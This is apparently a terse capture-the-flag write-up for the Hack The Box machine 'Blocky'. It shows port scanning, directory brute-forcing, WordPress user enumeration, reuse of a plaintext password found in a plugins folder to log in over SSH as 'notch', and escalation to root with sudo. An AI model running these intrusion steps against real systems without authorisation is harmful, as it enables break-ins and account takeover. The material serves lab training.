# ****Blocky****

```bash
rustscan -a 10.10.10.37
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ecf0b92e-d5d2-4163-919d-dad0e034c7a8)

```bash
gobuster dir -w directory-list-2.3-medium.txt -u http://blocky.htb/ -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/7d95211b-fd91-4afb-b3f4-69fe89add56d)

http://blocky.htb/plugins/
![image](https://github.com/lufffe/Writeups/assets/90646635/001486da-ddd1-48e3-bf3d-2c94e69196b8)

![image](https://github.com/lufffe/Writeups/assets/90646635/3a442b7b-377a-4924-b35f-c13c93236e5d)

root / 8YsqfCTnvxAUeduzjNSXe22

```bash
wpscan --url http://blocky.htb --enumerate u
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f8385c53-1cf5-47c1-8818-6eb7ce9e3aa0)

```bash
ssh notch@10.10.10.37
```

notch / 8YsqfCTnvxAUeduzjNSXe22

```bash
cat user.txt
```

```bash
sudo -l 
```
![image](https://github.com/lufffe/Writeups/assets/90646635/bd9bef73-1f83-4b3f-b6de-0352ee6dd704)

```bash
sudo su
```
![image](https://github.com/lufffe/Writeups/assets/90646635/608859bc-1f70-4c69-8c52-533739c8b6e0)

cat /root/root.txt

